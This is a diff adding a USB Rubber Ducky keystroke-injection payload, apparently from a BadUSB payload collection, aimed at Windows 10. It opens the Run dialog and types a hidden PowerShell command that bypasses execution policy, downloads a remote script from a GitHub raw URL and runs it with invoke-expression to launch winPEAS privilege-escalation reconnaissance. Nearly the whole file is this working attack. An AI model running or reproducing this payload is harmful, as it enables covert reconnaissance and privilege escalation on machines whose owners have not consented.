@@ -1,0 +1,11 @@
+REM Title: Taste the winpeaness
+REM Author: FalsePhilosopher
+REM Target: Win, tested on 10
+REM Props: Hak5, I-am-Jakoby for the IWR launch/ADV-Recon scripting and memes
+REM Version: 1.0
+REM Category: Recon
+REM Launches winpeas and saves a local file for inspection in $env:TMP\$FileName
+GUI r
+DELAY 1500
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/FalsePhilosopher/BadUSB-Playground/main/Ducky/USBRubberducky/library/recon/Win/Winpeas/WPL.ps1 ?dl=1; invoke-expression $pl
+ENTER
